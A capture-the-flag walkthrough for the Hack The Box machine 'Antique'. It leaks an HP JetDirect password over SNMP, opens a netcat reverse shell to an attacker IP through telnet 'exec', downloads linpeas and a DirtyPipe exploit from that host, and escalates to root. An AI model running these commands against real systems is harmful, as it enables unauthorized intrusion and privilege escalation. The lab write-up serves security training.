# Antique: Easy

```sh
sudo vim /etc/hosts
# add antique.htb

nmap -T4 -p- -A -Pn -v antique.htb
```

* open ports & services:

    * 23/tcp: telnet

* as there is only one open port in the TCP scan, we can check with a UDP port scan as well:

    ```sh
    sudo nmap -sU -Pn -v antique.htb
    ```

* ```nmap``` shows UDP port 161 is open for ```snmp``` service

* we can try interacting with the SNMP service first:

    ```sh
    snmpwalk -v2c -c public antique.htb
    # using snmpwalk
    # the community string 'public' works
    ```

* ```snmpwalk``` gives us the string 'HTB Printer' and no other info is provided

* checking the ```telnet``` service:

    ```sh
    telnet antique.htb 23
    ```

* using ```telnet```, we get a login prompt for 'HP JetDirect', and using default creds do not work here

* Googling for HP JetDirect docs related telnet and snmp leads to [this blog post](https://seclists.org/bugtraq/2003/Mar/36): it mentions a vulnerability for HP JetDirect printers

* the blog post mentions that the SNMP OID .1.3.6.1.4.1.11.2.3.9.1.1.13.0 ('.iso.org.dod.internet.private.enterprises.hp.nm.system.net-peripheral.net-
printer.generalDeviceStatus.gdPasswords') leaks the printer password

* we can try to fetch this password:

    ```sh
    snmpwalk -c public -v2c -t 10 antique.htb 1.3.6.1.4.1.11.2.3.9.1.1.13.0
    # '-t 10' for timeout of 10 seconds
    ```

* ```snmpwalk``` for the given OID returns hex data: we can convert it to text using [the 'from hex' recipe in CyberChef](https://cyberchef.org)

* decoding the data from hex to ASCII gives us 'P@ssw0rd@123!!123	"#%&'01345789BCIPQTWXaetuy' as the string, but if we remove the separators and the gibberish data, we get the password 'P@ssw0rd@123!!123'

* we can now log into the HP JetDirect telnet service using this password:

    ```sh
    telnet antique.htb 23
    # enter password

    # we get prompt

    ?
    # shows all supported commands
    # we can use 'exec' to execute commands

    exec id
    # user 'lp'

    exec which nc
    # '/usr/bin/nc'
    ```

* as the ```telnet``` service allows command execution using the ```exec``` command, we can use it to get a reverse shell

* setup a listener for the reverse shell using ```nc -nvlp 4444``` and use a reverse-shell one-liner with the ```exec``` command:

    ```sh
    exec busybox nc 10.10.14.95 4444 -e sh
    ```

* this gives us reverse shell:

    ```sh
    id
    # lp

    # stabilise shell
    python3 -c 'import pty;pty.spawn("/bin/bash")'
    export TERM=xterm
    # Ctrl+Z
    stty raw -echo; fg
    # Enter twice

    pwd
    # '/var/spool/lpd'

    ls -la

    cat user.txt
    # user flag

    cat telnet.py
    # script for 'telnet'

    ls -la /

    ls -la /home
    # only one user 'lp'

    ls -la /home/lp
    # only user flag

    sudo -l
    # the previous password does not work
    ```

* we can try ```linpeas``` for enumeration: fetch script from attacker:

    ```sh
    wget http://10.10.14.95:8000/linpeas.sh

    chmod +x linpeas.sh

    ./linpeas.sh
    ```

* findings from ```linpeas```:

    * Linux version 5.13.0-051300-generic, Ubuntu 20.04.3
    * CVE-2021-3493 (Ubuntu OverlayFS) & CVE-2022-0847 (DirtyPipe) shown as exploitable

* we can try [the DirtyPipe exploit first](https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits):

    ```sh
    # download and fetch 'exploit-1.c' from the exploit repo

    wget http://10.10.14.95:8000/exploit-1.c

    gcc exploit-1.c -o exploit

    ./exploit
    # this gives root shell

    id
    # root

    cat /root/root.txt
    # root flag
    ```
